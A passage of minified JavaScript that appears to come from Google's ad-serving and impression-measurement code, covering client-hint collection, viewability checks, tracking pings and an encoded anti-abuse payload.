      return null != (b = a.google_tag_data) ? b : a.google_tag_data = {};
    }
    function Kc(a) {
      var b, c;
      return "function" === typeof (null == (b = a.navigator) ? void 0 : null == (c = b.userAgentData) ? void 0 : c.getHighEntropyValues);
    }
    function Lc(a) {
      if (!Kc(a)) return null;
      var b = Jc(a);
      if (b.uach_promise) return b.uach_promise;
      a = a.navigator.userAgentData.getHighEntropyValues(Ic).then(function (c) {
        null != b.uach || (b.uach = c);
        return c;
      });
      return b.uach_promise = a;
    }
    function Mc(a) {
      var b;
      return Fc(Ec(Cc(zc(Gc(Bc(Hc(Dc(Ac(new yc(), a.architecture || ""), a.bitness || ""), a.mobile || !1), a.model || ""), a.platform || ""), a.platformVersion || ""), a.uaFullVersion || ""), (null == (b = a.fullVersionList) ? void 0 : b.map(function (c) {
        var d = new xc();
        d = Q(d, 1, c.brand);
        return Q(d, 2, c.version);
      })) || []), a.wow64 || !1);
    }
    function Nc(a) {
      var b, c;
      return null != (c = null == (b = Lc(a)) ? void 0 : b.then(function (d) {
        return Mc(d);
      })) ? c : null;
    }
    ;
    function Oc(a) {
      return ["omid_v1_present", "omid_v1_present_web", "omid_v1_present_app"].some(function (b) {
        try {
          var c = a.frames && !!a.frames[b];
        } catch (d) {
          c = !1;
        }
        return c;
      });
    }
    ;
    function Pc() {
      this.g = x.document;
      this.u = x;
      this.h = null;
      this.i = this.j = "";
      this.m = Qc();
      Rc(this);
    }
    function Rc(a) {
      var b = [],
        c = V(bb) || !!T.aub;
      if (c || T.aunb) {
        var d = Nc(a.u);
        d && (d = d.then(function (p) {
          p = Xa(p);
          for (var q = [], v = 0, t = 0; t < p.length; t++) {
            var y = p.charCodeAt(t);
            255 < y && (q[v++] = y & 255, y >>= 8);
            q[v++] = y;
          }
          p = Ca(q, 3);
          a.j = p;
        }), c && b.push(d));
      }
      if (V(ab) || V(cb)) {
        c = wc();
        var e;
        if (null == c ? 0 : null == (e = c.gmaSdk) ? 0 : e.getViewSignals) (e = c.gmaSdk.getViewSignals()) && !V(cb) && (a.i = "&ms=" + e);else {
          var f, g;
          if (null == c ? 0 : null == (f = c.webkit) ? 0 : null == (g = f.messageHandlers) ? 0 : g.getGmaViewSignals) {
            var h, k;
            vc(null == c ? void 0 : null == (h = c.webkit) ? void 0 : null == (k = h.messageHandlers) ? void 0 : k.getGmaViewSignals, function (p) {
              V(cb) || (a.i = "&" + p);
            }, function () {});
          }
        }
      }
      T.umi && (e = new Y(function (p) {
        a.h = p;
      }), b.push(e));
      if (T.ebrpfa || V($a)) {
        var l = rc();
        b.push(l.promise);
        sb(a.g, function () {
          gc(a.g.body, l.resolve);
        });
      }
      3 == tc(a.g) && 3 == tc(a.g) && b.push(Sc(a));
      if (T.opxdv && a.m) {
        var n = rc();
        b.push(n.promise);
        e = x.omrhp;
        "function" === typeof e ? e(n.resolve) : (e = x.document.querySelector("script[data-jc='86']")) && e.addEventListener("load", function () {
          x.omrhp(n.resolve);
        });
      }
      a.o = qc(b);
    }
    function Tc(a) {
      var b = a.search(kb);
      var c = jb(a, 0, "ase", b);
      if (0 > c) b = null;else {
        var d = a.indexOf("&", c);
        if (0 > d || d > b) d = b;
        b = decodeURIComponent(a.slice(c + 4, -1 !== d ? d : 0).replace(/\+/g, " "));
      }
      if (b === 2 .toString()) {
        var e = x.document;
        e = void 0 === e ? document : e;
        var f;
        e = null != (f = e.featurePolicy) && f.allowedFeatures().includes("attribution-reporting") ? 6 : 5;
        f = a.search(kb);
        b = 0;
        for (d = []; 0 <= (c = jb(a, b, "nis", f));) d.push(a.substring(b, c)), b = Math.min(a.indexOf("&", c) + 1 || f, f);
        d.push(a.slice(b));
        d.join("").replace(lb, "$1");
        null != e && encodeURIComponent(String(e));
        e = !1;
        f = !0;
        e = void 0 === e ? !1 : e;
        f = void 0 === f ? !1 : f;
        x.fetch ? (e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        }, f && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        }), x.fetch(a, e)) : U(a, void 0, e, f);
      } else if (T.atsb) {
        e = void 0 === e ? !1 : e;
        if (f = x.navigator) f = x.navigator.userAgent, f = /Chrome/.test(f) && !/Edge/.test(f) ? !0 : !1;
        f && x.navigator.sendBeacon ? x.navigator.sendBeacon(a) : U(a, void 0, e);
      } else U(a);
    }
    function Qc() {
      var a = S(x).omid3p,
        b = !!a && "function" === typeof a.registerSessionObserver && "function" === typeof a.addEventListener;
      b || nb(function (c) {
        Oc(c) && (b = !0);
        return b;
      }, !0);
      return b;
    }
    function Sc(a) {
      return new Y(function (b) {
        var c = uc(a.g);
        if (c) {
          var d = function () {
            3 != tc(a.g) && (hb(a.g, c, d), b());
          };
          gb(a.g, c, d);
        }
      });
    }
    ;
    function Z() {
      return new Date().getTime();
    }
    function Uc() {
      try {
        var a = void 0 === a ? document : a;
        var b;
        return !(null == (b = a.featurePolicy) || !b.features().includes("attribution-reporting"));
      } catch (c) {
        return !1;
      }
    }
    function Vc(a) {
      var b = a.querySelector('a img[alt="Advertisement"]');
      return b && /^img_anch_/.test(b.parentElement.id) ? b : a;
    }
    function Wc(a, b) {
      this.I = a;
      this.u = this.i = this.g = !1;
      this.O = 1;
      this.m = T.eavp ? 1 : 0;
      this.h = T.ebrp ? 1 : 0;
      this.W = !!T.opxb;
      this.D = this.A = null;
      this.H = rc();
      this.N = Z();
      this.M = null;
      this.T = .001 > Math.random();
      this.P = T.eeid || "";
      this.C = this.o = null;
      this.U = (Math.random() + "").slice(-5);
      this.j = !1;
      this.B = null;
      this.K = 0;
      this.F = this.G = null;
      this.V = !!T.fld;
      this.S = T.adsg || "";
      this.Y = !!T.uffp;
      this.X = !!T.espa;
      if (a = !!T.aifbl) {
        var c, d;
        a = -1 != (null == (c = x.navigator) ? void 0 : null == (d = c.userAgent) ? void 0 : d.indexOf("Firefox"));
      }
      this.L = a;
      Xc(this, b);
    }
    var Yc;
    function Zc(a, b) {
      b && 0 !== a.h && (a.C = Z() - a.N, a.L && (b = Vc(b)), $c(a, b).then(function (c) {
        c && (a.A = c);
        a.u = !0;
        ad(a);
      }));
    }
    function bd() {
      try {
        nb(function (a) {
          a = a.document;
          if (db.length && a.head) for (var b = ea(db), c = b.next(); !c.done; c = b.next()) if ((c = c.value) && a.head) {
            var d = tb("META");
            a.head.appendChild(d);
            d.httpEquiv = "origin-trial";
            d.content = c;
          }
          return !1;
        }, !1);
      } catch (a) {}
    }
    function Xc(a, b) {
      Zc(a, b);
      bd();
      0 !== a.h || 0 !== a.m ? cd(a) ? dd(a).then(function () {
        ed(a);
      }) : ed(a) : a.B = 1;
      Zb(Pc).o.then(function () {
        a.g = !0;
        ad(a);
      });
      fd(a);
      ad(a);
    }
    function $c(a, b) {
      return new Y(function (c) {
        function d(e, f) {
          a.D = e;
          c(f);
        }
        nc(b, d);
        gc(b, d, !0, !1, void 0, !0, a.L);
      });
    }
    function cd(a) {
      a.j = Qc();
      a.B = a.j ? 4 : 1;
      return a.j;
    }
    function dd(a) {
      return new Y(function (b) {
        function c(e) {
          a.B = 3;
          e && (a.G = e.src, a.F = e.sdk);
          b();
        }
        var d = x.omrhp;
        "function" === typeof d ? d(c) : (d = x.document.querySelector("script[data-jc='86']")) && d.addEventListener("load", function () {
          x.omrhp(c);
        });
      });
    }
    function ed(a) {
      a.i = !0;
      ad(a);
    }
    function ad(a) {
      if (a.g) {
        var b = null,
          c = 0;
        2 !== a.O ? b = 0 : 1 === a.m && a.g && a.i ? b = 12 : 1 === a.h && a.g && a.i && a.u && (b = 11);
        if (null != b) a: {
          if (0 === b ? 1 === a.h && a.g && a.i && a.u ? c = 2 : 1 === a.m && a.g && a.i && (c = 1) : 12 === b && 1 === a.h && a.g && a.i && a.u && (c = 2), a.W && (a.T && "" !== a.I && a.j && (a.o || 0 !== b || gd(a, !0), 12 !== b && 1 !== c && 2 !== c || gd(a, !1)), 0 === b && 0 === c)) break a;
          var d = Z(),
            e = hd(a, b, c, d);
          0 === b && (a.O = 2, a.M = d);
          if (12 === b || c) a.m = 2;
          if (11 === b || 2 === c) a.h = 2;
          if (a.V) {
            e = new Ya();
            Q(e, 1, a.S);
            e = Xa(e);
            if (0 === b) {
              d = S(x);
              var f;
              null == d || null == (f = d.fence) || f.reportEvent({
                eventType: "impression",
                eventData: e,
                destination: ["buyer"]
              });
              var g;
              null == d || null == (g = d.fence) || g.reportEvent({
                eventType: "impression",
                destination: ["component-seller"]
              });
            }
            if (11 === b || 2 === c) {
              var h, k;
              null == (h = S(x)) || null == (k = h.fence) || k.reportEvent({
                eventType: "b2rimpression",
                eventData: e,
                destination: ["buyer"]
              });
            }
          } else e && (((f = a.X && Uc()) || a.Y) && x.fetch ? (g = {
            method: "GET",
            keepalive: !0
          }, f ? "setAttributionReporting" in XMLHttpRequest.prototype ? g.attributionReporting = {
            eventSourceEligible: !0,
            triggerEligible: !1
          } : g.headers = {
            "Attribution-Reporting-Eligible": "event-source"
          } : g.mode = "no-cors", x.fetch(eb(e, "&ftch=1"), g)) : Tc(e));
          0 === b && a.H.resolve();
        }
      }
    }
    function gd(a, b) {
      var c = null;
      b ? a.o = Z() : c = a.o ? Z() - a.o : "?";
      a = "https://pagead2.googlesyndication.com/pagead/gen_204?id=opxhb&evt=" + (b ? "d" : "o") + ("&eid=" + encodeURIComponent(a.P)) + (null == c ? "" : "&ttp=" + c);
      Tc(a);
    }
    function hd(a, b, c, d) {
      if ("" === a.I) return null;
      var e = {
        omid: a.j ? 1 : 0,
        rm: a.B,
        ctpt: d - a.N
      };
      0 !== b && (e.vt = b, e.dtpt = d - (a.M || 0));
      0 !== c && (e.cbvp = c);
      a.D && (e.dett = a.D);
      a.A && (e.beid = a.A.eventId, e.vend = a.A.vendor);
      null != a.C && (e.cstd = a.C);
      (b = T.bvst) && (e.cisv = b + ("." + a.U));
      0 !== a.K && (e.vwbs = a.K);
      a.G && (e.oprs = a.G);
      a.F && (e.opsd = a.F);
      (b = Zb(Pc).j) && (e.uach = b);
      e.arae = Number(Uc());
      var f = "";
      pb(e, function (g, h) {
        f += "&" + h + "=" + encodeURIComponent(g);
      });
      return eb(a.I, f);
    }
    function fd(a) {
      var b = a.P;
      if (b && (b = x["bllsn" + b], "function" === typeof b)) try {
        b(function (c) {
          c && (a.K = c.block ? 2 : 1);
        });
      } catch (c) {}
    }
    ;
    S().btrp = function (a, b) {
      var c = Yc = new Wc(a, b);
      return function (d) {
        Zc(c, d);
      };
    };
    S().pdib3 = function (a, b) {
      Yc.H.promise.then(function () {
        if (b) {
          var c = void 0 === c ? !1 : c;
          if (vb()) ub(window, a, null, !0, c);else {
            var d = x.document;
            if (d.body) {
              var e = d.getElementById("goog-srcless-iframe");
              e || (e = tb("IFRAME"), e.style.display = "none", e.id = "goog-srcless-iframe", d.body.appendChild(e));
              d = e;
            } else d = null;
            d && d.contentWindow && ub(d.contentWindow, a, null, !0, c);
          }
        } else U(a);
      });
    };
    S().vv = function () {
      var a = Zb(Pc);
      if (!a.h) throw Error("aiv::err");
      a.h();
    };
    S().sasrc = function (a) {
      Yc.H.promise.then(function () {
        var b = x.document.createElement("img");
        b.style.display = "none";
        b.attributionSrc = a;
        x.document.body.appendChild(b);
      });
    };
  }).call(this);
  window.stcc = btrp("https://googleads4.g.doubleclick.net/pcs/view?xai\x3dAKAOjsu_1j1LrG9zv6R5RgwM7Xz7D9l5AKI-lvJaZQ0ZSVqFosO4k0APBraNXH7Z5kUMaW3Q31j59A4CpjuDVDWy6v333v5sNohyKTn-gbMS4XFvy18vV-qZ-lNdDxHZmEmAyQ1UgsQ41vGn4CY9RzdMywnKIVjfdn8GNHIw2j6tcm1L\x26sai\x3dAMfl-YTe10_FBjosPACaTWdwHBz4UrTs4yd620cVS1kE9GoFdMs22anV8Osirt79YgOPPiTGNbnKYiuuxMP-UdPGWraWHGACzEi7Kfj52w\x26sig\x3dCg0ArKJSzFyUNCIQNro_EAE\x26uach_m\x3d[UACH]\x26cry\x3d1\x26fbs_aeid\x3d[gw_fbsaeid]\x26urlfix\x3d1\x26adurl\x3d", document.getElementById("gcc_LRniZPWrDbe-vcAPqcqyoA0"));
})();
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
(function () {
  if (!window.GoogleTyFxhY || typeof window.GoogleTyFxhY.push !== 'function') {
    window.GoogleTyFxhY = [];
  }
  window.GoogleTyFxhY.push({
    '_scs_': 'BWvyVLRniZPWrDbe-vcAPqcqyoA0AAAAAOAHgBAI',
    '_bgu_': 'https://pagead2.googlesyndication.com/bg/H7NiGUBWITXDbUXvzcl9NdwFkmo5ojjKC-Hhm2BY16o.js',
    '_bgp_': 'NjWv/61h9bBNksmAl6BJgLTXLdJsLGrRoLwXb14NRTyh9LtUBTSXnMYXahwuq1gH4VbEkfngWJT8kBI2hAWpgd43Dz5XgOtJSyC6pMChIMrkDjh0+d8Yapu6i5Q3Pc9p72KO19Zthrip/YwQaYmp4Xw5DWXAVc5ssj6xJ7I1eLozC2ReZTSijcZxRLjrnbkX5n+huCzBVoB4hZmylWT1bNXOmduO0pt2PrNP3cIIKkNahByyi/OdVquP78IuNXG8yozuqpk5XXzLbEg2S0HuvqXUaZ18/QBSedPE37mGh+2J6UECSyxNMvjWVx2qSs4ZGJJ2un6Ye85kgRSlYYTGXA1byCqCkZZnvscPxOYdxjGYBV5q5GNHGJHqT/dC9xBPI+mYcNQiKoBhF+lFrv2Pf2v6uia9dm3GxHBG+1AUZfzRILPFYeYiiUMi2EDs36h7HFWZcewQUGftM1t162NbgeyzPLrJp+0A6Sn/Y5cgKq3pDiDeI9kh6sVFBDqJ7dL2/2czMRF4flvNwjOcpU/xaOx2Pc93FcTkAHEOP09EwwCXeQ+GqjIhCpq9gHvjbam8Cqt28Bbt7tXWvUNnprCwoXzF7cKYn+W8cbv0hElYeGs9PWf9GvmxcViIj5loyOa8jL761kn5ZRYs6g2xFBrfhmNyVO3BFtUDOlj6KIIwZhD3UJM75Cmw1vKBohgmmcLzV2dd/AWSres2FUOk3EZ7dZGUwPeTGh/ZDiloCrpWeuAguejuVqVezW9IKKxjXS6spSjoNugGXMarKbyWPkPI9DWIE8tFwbmJqJ3qaCipCUeZL768GUivfDu/sBduPFC83AIb5BcWYIaAHZa2UHfcScHmgMl2ZEGGil4gXvCdmU1sHu2LqwIoKT77UnSG9ikVQZ1BIRZ63uurvueeg1LowZNV8gK569SOUwCMX7xFtJ5JwKcSgD4/R64hWiBojZVaoAJegYcPqtmglghoiE2aVpvfPSNF6Tu5P1Pw5lwXEuOxJGf/2NrGi9ExK09CqNv9JD1QcRwUa0iAHi0Qc/Zv+3zUqwmeA3bxnypMHX30PDEs5q+WraVKPbQylX2VUYcZ9vnjhLucLFFIwLedlXOeIygoLL9y2IdzpDSrnOnohVMfuBvC4aZwWCZjNgo24gwlLu3WplxzOlUg7B9ABC6GvGh6W022C/A5etZCnp3kjg7hELnGWx60uoFpv0xa7mIKmS2eOJQJ3HB7q1ickF/F2uPfCSLxiTsK0h8qXyH32hwGsfOZp/xw7vTb1lLnSfxYIYDXpA+r8Iv69AHvPtpL/V0eyzVx4iiZTQ2OfvtW64F1iBwkpnzymfKmJf+rlvae/F7pdYCKvu8XmAzjbVTTqRStYtd8jCSv2/fPyBsZGZahRYEH6tY2OGlnDjw51ZmPsCqomvNKjKdsvffmYRGFKH/6bk1eqQFcwL4C80SUorUGaRnJ0U7w4dhaUW8WvrVj6FQoEq5Yt0wCLCQoVRlWmZtv+/i9msNEvuA3s58S5LOQ9/SncagD7Qw1gEEhUg7pLmQgJd/iJ3DEsahM7FO2sHDzV9Fu3D6wXbIuJQyTJxWQKDNvi7Yq9VEyfSC6WjVCqCarqEZ8dmzitMezWsZK6+3QnA5+GKt8APhmiasOHzEXf6q/UuXWRVEOEPOCM365/fhojjrpWj1lRUJFq79kvqjjRJrVW1wXL5rA80/deBKxrLtpg3ZtdGOVUROHHqeBw55fUG31ElQ9Kn2hX7H3n2OVtMk7PDjI9wzsrzE+FLYhuUaMYE4osixLCZUORS7r13DG6orLPx0R+wNyYjA3IGWsV+Pze7AmejqHNCSH/o+6qwW3+4q1Foj14Q0RJDkezccT4Wv+R4p1hYpXqIlcAhU8G9giBJVZZKUGiMkRgEjBtWqBTkEPqsw2JRGhC06+8VUUzHUjL/Fe++yr8Ea2INKxp025JYpL949fJnAg+sTi1xXr0DOnrG9KtxFsOA8K356M7l9E8H8pICuNgUGW8+iUqBhDI5rM+tf6a25T6GAXxv4+hDWXQGOkExDApENphUKfb+T3RqLaiBSiNkOGuRR9Vn+9iBoA/LUoVxXaaSUMEGBXVuC9M/zjBUy/8JW0IMMVnDeIq4OJv721vGQd+6xgz/GG8DRrtzDgmAkhtTKbwJUySTHbKOF9mLNhV8xpDrt7C7/Y8jYj+04tYr4BKAZHf8GUBSlM9dWJpyBy+6YF+GjtKTry5jxxq+1Kh5TpFHW2eJVGQoWA8qwSKaYkLXnGUO7VlReB+Y6n2DDi5b54xy1nGQ9UNVZZHxEHdkrCmgo8n8rsmGQEeCBakjc78eDX6xXx8ujbKABq7GXPGC0IU0tSRmPuxkmY0kWN3ncirCXmhN2748cTtXbEZ8fT/uOaV9W3VAZeA66zYlAmmaD8tKJAwLkQpyielenWMwes0AlB3oiJulp6WpahI+B34rOi+OMinnog7D202e5qd/QKOWARpa9rbWuKV/y19cxmvjUmG1Dc8Pdfy0LzjqcZRXcyM5U3gSEErwRqFDVBexL0XNTrSLQ/pjTVeHNwEHdsgvAUNklrba23cktSs+T5grF9pmxF60eLbFyVB9hEQomFLeMhDjo/65LYDUdJn9aDEExGSNUn9g1//5PI4RtyCawRlFzda9CKF164U+l6SaIwn4rtSXqrR4s2snYtMygSWo6ziPSS/Cko2AVe/AXM2o0qDBXUAuQTzMOKexBRHWK9TacPr37ZheOP2W//F26HeyRBs2+TboSeVw3tyPt2x460/JO0CaeEgOccNF8tXpyK80cokWBH/YnrkasSU3PPpxKh/ERlKEtCMxdrfhIG9hi5b9rydxHxhR4ZQ7jVAWuAH+EewsTx0E8YMRuqp1evJg2WdgKvYSU+/3B7I5u4Hl3BahXVHdJ4BSIfWmGTS/8HN9nHHqQFClN/fqeFNgg3aGwT2qCd1AQKSAkTxnAph+AjHgYlBC+ZNbmTLeCQrXtHTRMxdPxEz4l85aTnZkDDWrhKwZvQDYegyiXZw5qrkFXDlEzs5gX43Bg9XNH9VSpMCXjphI4MuYWca+C4mkCNFYPHECKZ9LHUzdHOqbCSVXh8eVKixN6TnTe78vFF3tQ7NSDVOhp1GeBBfs4Ej9kOLCOMJnJE+GNIdx5Oh27rlAZsf7MuAIzY52ntKPWDynhaZ3oVcU4xf2m875vXykD3RotFLkXmvJ9p9zP/c4sXikkP9OdKlUxdYswaeoqzHVeHy/99wYOeoqiBVastP5rxmdSCOHOtGMCOg7moX3Ldk89pvkbYH6zgp9CXnd3v6IzB95mt+AKanQjpxbDuGHyv4VJoLz9CrqaQAjvTd1upsm9D8iJnQgF6qvC7R0KVPm7igMuxaikXX7vzYaYuTdlGLsfKUNGr/9GNXRYQtvYSM1tIkWg1ze0TfWwfhSW5rL/wI9VIINV7vuGlDY6xSysfiUOoJGT0cSMJSj5JSPX4rETbQGfqlg/pQAblOOiwNbPfdBnKEuqrUGX/Sswth4XPwv5sacprH0B2i04Jt7XXBNE1oN9dEp+0DxTKWZ1/zOymufyKOsnHnLgCSpz6J7IRPcT2icpxThKjM0Crpv1qCShUJUY06bUP8txR2tSG0PVKnczoDWH29HxBd1eP5NePZ2fc2facrKv5YFAm85chkw9Lsk6WrIx6MJk9FCNcnVFz0gmNHReoyshgyZ8hjB5mMexVL6QIIAdufU4lO3ZrqTrqjgvulIj8kKC1/PeGRlcezn/RGwpoYzAS/2uIuAiX05d05hRlxouMmfDFv8t0mj+kW6t6hhcUkbobljHf0IsK9os93fotR/o7kcjld+MIw2g8GzOGBeY/4/9hfAzAak28ruj0JNHjVhx6i3PvNUHXPd7wIFZkTWIHxbLMDrleca4aFqfZdYjbuC8tC9C2BkVZHnj7kzQnR4BESLmczHvwO7q1SiYjFrsORZUH9k6nZmNXJsWLOiMkcY0N2FWKgX/gMp3Xnt1Jjz9dFL3IyVTk7nCON5qoL2oJeDIQynb2Zv4U6uGOon6zh4tXEonPZV9Z+wh/CFCvR/ryKCILaI0WdeYftrDAImz+YuG6AJ895UUofXlMgh1NRm9Y+lhA9SAkbVsdCV3v5mCjefOh7MRBYlfn6m2UQouaYOsuPGbChqoCZ/BfbMOj95srbLraOMEI9GyIZI38rOJqR5HsWyxGUR3ff0dvrSRUlZJiYxQwl8ZPa4ou+CVn3feRp1JaGUg7Lfn2Iqm908D5nNLLxuAR2CnxQ4MqzPItb/opUXp6VUxgWopCgD2ZNu4gxLNtpmuG/JdgL3bn3zLqGv6JSyoz4TtF2RcagYgkaWbh/2sh6T/x/N5pjEMpaAGt00+ekTux/5BAFcl9AmnrR/UL6URoPKDI1FwvwwIeRHKyizvM56g9HozrcZ5sy9piTNjI1IvQ3DgmykmXEgcT782TohNeQ6zv6jPJ8xXpIvUwkFyrPgH9FzuTCTBPaJI9MD2R1y/IfKIQyAcv2iWjTtWPpLX4yaZT1rnSYF5lJhZjWoJAa/kivvofEemX3eWqeE14YX9JoO2J1DPqyX7eL6U0xAHqkvVr4vt34Y3hd2CngSj3RWo3McCgCo1d1KV9SeOXet2KnF05P9xF25bbo/pkvBPqpwJ5MC6RGC2poHsxkgO//jCJgb8vpP0JPuJNTAjEz9SJkvzCFN0V6+u1MQW7J2CdVcsyr0oUb3QHxDCiTJaQymUOcgMSUPDwpflddHYXC5NGcUvaENMmQTuTmCEpgKS1Fy0a9KDCdRFnR1mc2PIpF50Q/QOB7wCdNAQJCHiEU9DMfHh4ulJS0gdOWP1069a73pqTswh9HyznPKt5v0R88WS9dWH3kP/aJYPfmnPNrN+jlEPvPzQ55ap9WhHzfce8F+40VrnjUKHIZdSQqaGEAn2Xjl2cPExF3wsnlifz2j0JQVo1INTkV1D+rqQGjQJ3Nxi8/yUDfCLH+il3MikZ5Uzksv1sjR3dji7/NXKJObsEo21TNnZjaBEJHUs81vZgadzRkfC1BR2RuuhbFGFiZrgv9BOggfvicSrJHC3UUX3eFHhfC89FYWjRsLseC91nXolvLCeugS3JX1uFB3/rJGQ0t26FO1rRsd0LMaGDJb5UPwG2CT1chOuoqtIJPpax5uVfQStzBgaIEpIFOFoXo2pbgKwH9sJCN3FBoQjxceiS+yyDYZ9pq+6ErxYYJ/SiehdVwcvtwU4rwI31YRUNUN81dLufBw8aSqfDxru7RhvxmiULeFME+h4zNGQlN6c+TwbDEWbG++MxwtBIR/5Z4MryR2Tfw+tMu59tDAl1FCppz37S0+cJ564C1bNUrR0+yJ3p2Qko0z6qBkZJoGbw3qxG//ccT6/CZs2wf9EuNI6hY8O3e5FKYLX3gRExIP2guKjJbeJjgypH+MFijQnyFo70CAdNOUFia9cHdO8gw9sjEDjgWQpipwNiCDfsEEoDYyMqRudAjHKWmm+ATAgVC38uTipO5geG9JCJgtLapPzySNwme1jKPLnwSWYx9u6t4Xqt3W367Tc/bnc4ygJuGqd3PTW5twX0PRcU0SxJPg+y3pBqbUNFVhCMJCuBFK8XS68UiYK6e684G0H+/urMeph9I+30UzoHW6OGN/lrTXtPfpWnI3iSDR43CNDejLMtAnCgS5Z3qYy2f0F35BNS/crMmBuA3juCcYbq6C+zqyBNoClEc86iVG3GVkP5wMWhs2XWSnKBKz58FfVKVjHBr8OAo7m5XJRWPFTpmdPg0OWQBEpGJ6bvbYe5Yr3w0DaGsKOsS6EHid3TYwLMpO6aZJZjyj01zeCzXvBvtNR9f+YjSoq4IrGmACbzL1EdlNqkIgxWzPoaUflJJPUwwc9mra7F165t9VVg1hrs6FEsMk0CX3u4xDDYBgXtDXYDgxcRU0voI0P445JF9J9TkU8XoovirCE7iTL/neNdQaFP0JzZkSEM7PitWZDLY0WilgNWOwZbmPflCUEx7cShvFGGZs2lp/zYBwjDZGqGANeCFrhF+nfFx1ToyusylXLqsyMUMLuW/6fv7Xcs0rGHy4kkfdui7Xbf7pktM7ybDlO1Hj2h31Vqrmj+iiyYu9WqeEiu0uZecX3Px+8VdWXROEjiFQXYwfEiQjkPt+67B5ZnT5/i2DJUZnFsZrzSdkIGbcj3o0NjQhtlgeVR1ceXfPccdmpbNHH/g6s0ICjsjjr9sore5rkjRqOtCR73tbXJgxYaTiBotxn3ZQQlPpjwXLRnD2d4cbdekM9SeHaBQomZ0v61kpbbpYOXedVrwFaSsLk2cpCdcZVH7Irgo5febQAOUdBzBdooI/XnBNfrX/u8fYzVIzr5WXgZFuTjeF55qgc63nmLymEvIP762xQaIY42aifg8eysgQ312Vl5nA5X4xQ0ChNepF9BbeJ+Mro2vg6Wa+x+EakBEiv00eX7a5WkjlsjiHpy27inu6YOrT+uLf8rfLz2271Bp5AujokIu2xgmDqLBop+Ff2n/jje8Qgq2hRfCdMEQXI3kZ6RAjl7Trg5Go0lciGU0knw8mm9+kCFhCaf9sftrfeoX4zf+xU156dcCXrLL9pfEpEfCk5kbk1w8iHOctjrGzIqzmMveNq6nw18UbpbzO4zmKa5kRCYTQCwR3ts8/VkgbWaFXK7y9rfTTc/s/XvCIVT9qJahrm9YTZ3LRPo+XO+B/ZxGMM0E9u9AEs9WA0bK50riJsG861BxdNua8FhoWbga2AUrLQEv9z3RyifPcxjTEJSF3QrvLhOIczaGey6tbr+rIhy8DnXeraA570m8j7Wqj2nfmASIpHiCIttyug9cZwc2mXX1Hdf8Bf68ZvzuNGPc6F//OUINp4H0fQJ3v/jNX5kvMQZBTbA66YiFclF1KYnEBVPILyp5+vWf+npLr7PuhbYgfFmOF9m8mDEChlFphsOCbyOWliR9terCxsZcuCtnCAKhtDb4QeGVpLJh3xO9vkP8OifQrDNt4Ug/+tKBbRSi442/VRrhtLlrHclhX0H2ekHf08pw4fjqwo07NDhecUpKqYvAU7tn7QJ4qe0tKWtFDE+Y+wgmZmJ7RLoZb0gxRXgYrWhJSXO2Yl5Obn6V20sIDjv+kUBcgnHC/OcaBMHM6uG0w0cMk9bYnG6A57z2mxkoXUC6qUtWk8TapQzmFnM0UA4QAGrgYgolkY8qZ9NF9RQxva0JhV3/KVfC9N1B1nmzhGB4qvhr65p0OQi3QRtbA9VnLS3EJStCvztg4bF8kJJf3jzkBP+g6nwL+Cv9NwyxEa/Z7tRA5JTvLYdNNGjAZ6uk97zjHKUzQFAy0/VMOdtMpA/XUnxcvfntT5a2B6NXPeTZSh7HAWM5iag5EgkByOCoSK5EUyJWJrobC/sUcB8Pi19s8QaS09UrPSkf3ugub021WxryIBD+i3yH5FCsNqEVAjfpSAqttPMrnrgXblM3BQTLoLJqlLGhAJzQl9zbHxuVfCh4X620nAovhenHfa135UVrLvZsJdN6U/X+r5X1cI488LIyB+ocul9fUI5TfxM9Qt9U6dqbDSOvsMyo0Lu3BvamhX//9zSRfDZtgHHQs+7+O8DgUrpzYr2ltQAko7eos+T2O4gyKN1P+niPopg+j4YnNrIPNGBdtYX4As3tfMJZ2nCNFHosxrsSe8ke9HTNy4UfYHgXWOghETZ2Mb003EB+YnF7kUSjBJyOQHvZ4v84HFQaJWWrQXUIhaWskqah1qX3Uli9rwvxcZfJVJhw3ikbQ7MC3pEB8bKy+SRzBiVjES9S1EjQL5B74+px8/TnQuRlZCsWJQAMFTKcGB79HOEGhc4LirF1apd5+Rjhv3wDbWMVnf7xzu0h7a8QISlbIjIVbGahQXlEOAR8Qmbrgh86hBRQ2b5BmucFLuJNlzVEGYsLjkPfKby62aRZBnN/lifQlFarbiPaJn9bTiPPytadJUf5jL63Ib4DGgU/o1J7BGZCa1ZZPItIbO5274TxkrCIMuhOH5XNKJkKGl8DWXbhHVpkXGjQJZAPE+zHDHGK+S1RTWisceky4XPa3EsNBzv5Cm4g01W8wQrXIS32CCtb2U1RvZ+6eq0wkm4TUWaOgJ3+yCHBAGav2SKXwLKoWzny3M4I6bOr/S91RAv0I6qSqc6jh+W3z9OV9ouhYw/PflooAjO6ey8NW90CV1GEGS0iJuDyOgVtknlWO7ZVLyXQL4QMsD2AwSP1eXua7krTQHnDEFIOHaUqrVYZBBaX6IIV1MEg+AlfA4ayb6zLqoyWp3g4LxGxfzbAeZydkeW4tihJL2FjUzpKcXDGJHbGXvZodK99m4Y1yeQCXGZam8RP/kQo6VEOpX/gTBJMLhCqOi7f2HRx4frWR7sjrztVhnXQW0E21N9/S8zvdETEtjd0vxO+fZS8+aP4AfnUY7BpoJeKFZbzt5KvIpfDdvbjMQQ5ztKEc541mCDSdcdxWxlTeXA1uVBxLMTGYbvPtTQ043gW7rlz/MOPfU/TKnoOsfc6XayjOpezjaROzM7KsoJZd76nA7Yx8kIolmqUvRrA1KFYiBoVPlFgOAn+1xAcnX6rtd/rf+4IO525S3ufeVfU2C70pbMhOxBYa3RCME114kYfjaqVMCp9U0kLjA/5kZQ9x7Gb3uhglzIx0EnCKypZkcp0q1VfNi6NqRDQtE73e6wDDCpqiJeE+egSg03jyu9YHqw49uaIJise1my10/3OhHtmTbsXjYT+R2VWmfSXvOpvTBKWuaCTxM5GRTNR7wrqbh4aL3zWJ3g+FVbdiPuXyNWFC1hg+Z2APd0aNsE1QcjXuaOFYSZqfmsNkg/dnNy0yy7pOaC2CNBR1h4rJXblnZZDpOvFfMfUbP6BvxTLAzm0wqIpHaHNgigHVgAcwj85908h1K253FicenF/xbSGGpVvkEsbZrFEN2yD+fV5onh+Go0XmOknaMO0